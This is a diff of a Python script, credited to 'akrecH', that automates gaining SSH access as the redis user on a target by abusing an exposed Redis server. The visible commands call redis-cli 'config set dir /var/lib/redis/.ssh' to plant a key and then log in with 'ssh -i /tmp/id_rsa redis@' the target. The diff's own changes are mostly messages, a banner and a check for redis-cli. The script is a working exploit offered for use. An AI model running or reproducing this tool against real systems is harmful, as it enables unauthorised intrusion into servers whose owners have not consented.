@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# SSH as redis user
+# auto SSH as redis user
 # Coder: akrecH
 # Github: akr3ch
 
@@ -10,23 +10,28 @@ from termcolor import cprint
 import sys
 from time import sleep
 import socket
+import os.path
+
+path = os.path.exists('/usr/bin/redis-cli') or os.path.exists('/bin/redis-cli') or os.path.exists('/usr/local/redis-cli') or os.path.exists('/snap/bin/redis-cli')
+# check redis-cli is installed or not
+if path:
+	pass
+else:
+	cprint('[-] Unable to find "redis-cli" in your system','red',attrs=['bold'])
+	exit(0)
+
 
 # the main funtion
 def main():
 	
 	cprint('''
-	
-
 ██   █  █▀ █▄▄▄▄ ▄███▄   ▄█▄     ▄  █ 
 █ █  █▄█   █  ▄▀ █▀   ▀  █▀ ▀▄  █   █ 
 █▄▄█ █▀▄   █▀▀▌  ██▄▄    █   ▀  ██▀▀█ 
 █  █ █  █  █  █  █▄   ▄▀ █▄  ▄▀ █   █ 
    █   █     █   ▀███▀   ▀███▀     █  
   █   ▀     ▀                     ▀   
- ▀                                    
-
-''','yellow')
-	
+ ▀''','red')
 	
 	cprint('[+] ','yellow',attrs=['bold'],end='')
 	cprint('Removing old rsa files','grey',attrs=['bold'])
@@ -49,7 +54,7 @@ def main():
 	sleep(1)
 
 	cprint('[+] ','yellow',attrs=['bold'],end='')
-	cprint('Adding config file as /var/lib/redis/.ssh', 'grey',attrs=['bold'])
+	cprint('Adding config file at /var/lib/redis/.ssh', 'grey',attrs=['bold'])
 	os.system('redis-cli -h '+sys.argv[1]+' config set dir /var/lib/redis/.ssh > /dev/null 2>&1')
 	sleep(1)
 
@@ -69,13 +74,15 @@ def main():
 	if result == 0:
 		try:
 			cprint('[+] ', 'blue', attrs=['bold'],end='')
-			cprint('Trying to SSH with '+sys.argv[1], 'green', attrs=['bold'])
+			cprint('Trying to login with SSH - '+sys.argv[1], 'green', attrs=['bold'])
 			os.system('ssh -i /tmp/id_rsa redis@'+sys.argv[1])
 		except(KeyboardInterrupt):
-			cprint('[-] Interrupted by user', 'red', attrs=['bold'])
+			cprint('[-] Process interrupted by user', 'red', attrs=['bold'])
 	else:
 		cprint('[!] ', 'yellow', attrs=['bold'],end='')
-		cprint('It seems like port 22 is not open','red',attrs=['bold'])
+		cprint('Unable to connect with SSH','red',attrs=['bold'])
+		cprint('[!] ', 'yellow', attrs=['bold'],end='')
+		cprint('It seems like port 22 is close','red',attrs=['bold'])
 		sock.close()
 
 if len(sys.argv) != 2:
